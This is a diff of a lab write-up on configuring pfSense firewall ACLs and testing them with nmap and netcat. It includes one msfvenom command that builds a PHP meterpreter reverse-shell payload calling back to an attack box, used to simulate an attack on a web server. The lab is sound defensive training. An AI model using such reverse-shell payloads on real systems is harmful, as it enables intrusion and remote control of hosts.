@@ -4,16 +4,16 @@
 - Apply security solutions for infrastructure management
 - Implement configuration changes to existing controls to improve security
 #
-<h3>Lab Set Up</h3>
+<h3>pfSense Firewall</h3>
 
-![image](https://github.com/user-attachments/assets/daf27a39-fb8f-4890-a6ba-640a1bfe1619)
+For this lab I'll be using the pfSense firewall. pfSense is an open-source unified threat management (UTM) appliance created and maintained by Netgate. pfSence works as both a router and firewall.
 
 To  connect to the pfSense firewall, I just type in its IP into the browser: http://10.1.0.254
 - 10.1.0.254 is this network's default gateway. Usually, the default gateway is a router, in this case, pfSense works as both a router and a firewall, and that is why it's this network's default gateway.
 ![image](https://github.com/user-attachments/assets/ae1d90aa-045d-49e2-b85b-98e6ca659194)
 ![image](https://github.com/user-attachments/assets/fe92ec5f-12df-4dd2-bf51-ef06452c75ec)
 - This firewall/router is configured with one external and one internal interface. The firewall screens the local network segment from external networks, allowing only traffic matching the access control list (ACL) through.
-
+#
 <h3>Reviewing Firewall ACLs</h3>
 
 I can access the ACL or rules by clicking **Firewall > Rules**
@@ -42,7 +42,7 @@ If I now click on **Firewall > NAT**, it shows the hosts that are designated to 
 
 In order to demonstrate how a server may make other hosts on the same segment vulnerable, I will run an attack against the web server.
 
-On a Kali VM, which I'll be using as the attack box (AB), I'll start msfconsole and run the following commands: 
+On a Kali VM, which I'll be using as the attack box, I'll start msfconsole and run the following commands: 
 
 1: msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.2.192 lport=8080 -f raw > /root/get.php
 - Creates a reverse shell via PHP code
@@ -134,27 +134,33 @@ Checking the firewall logs (**Status > System Logs > Firewall**), we see just th
 ![image](https://github.com/user-attachments/assets/45e04c13-f741-4372-a9c5-9cf2299d1dce)
 ![image](https://github.com/user-attachments/assets/0bc78382-f4c1-4bb0-852f-7cf51cdec408)
 
-This is actually a hidden, default deny rule, that blocks any other traffic arriving on the WAN interface from an external network.
+This is actually a hidden, default deny rule, that blocks any inbound traffic to the WAN interface from an external network.
 ![image](https://github.com/user-attachments/assets/96927429-a1ee-40fd-b75b-77d53edc1318)
 
 Now the server has been successfully isolated from the other hosts on the network.
 #
 <h3>Challenge</h3>
 
-**Configure an ACL that blocks hosts on the vLOCAL switch/LAN net from accessing anything other than SSH and HTTP/HTTPS on the vDMZ switch/OPT1 address.**
+**Configure an ACL that blocks hosts on the vLOCAL switch/LAN net from accessing anything other than SSH and HTTP/HTTPS on the vDMZ switch/OPT1 net.**
 
-These are the four rules I made to make this possible. Each one either allows/denies traffic specifically from the LAN net, to the OPT1 address. The deny rule denies all traffic including SSH, HTTP/HTTPS but I put it at the bottom of the list so that it will no trigger before the other allow rules, that way SSH, and HTTP/HTTPS traffic can still pass through.
-![image](https://github.com/user-attachments/assets/8a979a18-06e5-430e-8151-61a98d0a2d0a)
+These are the four rules I made to make this possible. Each one either allows/denies traffic specifically from the LAN net, to the OPT1 net. The deny rule denies all traffic including SSH, HTTP/HTTPS but I put it at the bottom of the list so that it will no trigger before the other allow rules, that way SSH, and HTTP/HTTPS traffic can still pass through.
+![image](https://github.com/user-attachments/assets/d2e62656-5499-4b03-8eba-89353252ee56)
 
 To test whether on not the ACL rules work I first tried accessing http://www.515web.net and http://10.1.254.10 from a VM that was on the LAN net, and both were successfull.
 ![image](https://github.com/user-attachments/assets/58fe5c65-ab81-4ef9-9701-b570d8115f83)
 ![image](https://github.com/user-attachments/assets/d93681d5-aef6-437d-af7c-c267d8aa5b5b)
 
 Lastly, I switched the Linux VM (attack box), to the LAN net and used nmap to test ports 22, 53, 80, and 443, and since it worked correctly DNS port 53 was shown as filtered and the rest were open.
+- I also tested agaisnt the top 100 ports and as expected 97 came back as filtered and 22, 80, and 443 were open.
+![image](https://github.com/user-attachments/assets/cc91a8a2-df07-423c-a21f-34682a354867)
+![image](https://github.com/user-attachments/assets/ad3f6ace-9550-4fb9-b0ad-9f7ba8a4d5d0)
 
-![image](https://github.com/user-attachments/assets/3b23c180-fd8e-43a7-957d-c0beb5bb080d)
+I also used netcat to show that traffic over common ports like 21, 23, 25,and 53 are not allowed, but 22, 80, and 443 is allowed
+![image](https://github.com/user-attachments/assets/aa38d290-ac04-4cd7-a1df-da7b11d5d6ef)
+![image](https://github.com/user-attachments/assets/045adc42-ea13-4229-9729-ccf6b91bb027)
 
-
+#
+**Summary: In this lab I was able to get some hands on experience with the pfSense UTM, and test ACL rules to permit or deny traffic based on security requirements. I also used MSFconsole to simulate an attack, which was possible due to poorly configured security controls.**
 
 
 
